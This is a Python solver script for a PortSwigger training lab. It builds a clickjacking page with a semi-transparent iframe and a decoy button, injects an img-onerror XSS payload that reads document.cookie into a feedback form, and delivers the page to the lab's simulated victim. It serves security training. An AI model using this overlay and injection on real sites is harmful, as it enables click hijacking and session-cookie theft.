"""
https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss
"""

import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

site_url = f'https://{site}/'
resp = s.get(site_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

exploit_html = f'''<style>
   iframe {{
       position: relative;
       width: 700px;
       height: 1000px;
       opacity: 0.3;
       z-index: 2;
   }}
   div {{
       position: absolute;
       top: 800px;
       left: 100px;
       z-index: 1;
   }}
</style>
<div>Click me</div>
<iframe src="https://{site}/feedback?name=<img%20src=1%20onerror=alert(document.cookie)>&email=baa@pdx.edu&subject=foo&message=bar"></iframe>
'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}

resp = s.post(exploit_url, data=formData)